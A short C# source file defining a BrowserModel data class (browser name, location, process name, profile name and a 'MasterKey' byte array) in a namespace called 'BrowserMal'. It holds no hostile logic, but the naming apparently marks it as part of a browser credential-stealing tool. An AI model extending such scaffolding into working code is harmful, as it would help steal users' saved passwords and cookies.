namespace BrowserMal.Browser
{
    public class BrowserModel
    {
        public string Name { get; set; }
        public string Location { get; set; }
        public string ProcessName { get; set; }
        public byte[] MasterKey { get; set; }
        public string ProfileName { get; set; }

        public BrowserModel(string name, string location, string processName, string profileName = "")
        {
            Name = name;
            Location = location;
            ProcessName = processName;
            ProfileName = profileName;
        }
    }
}
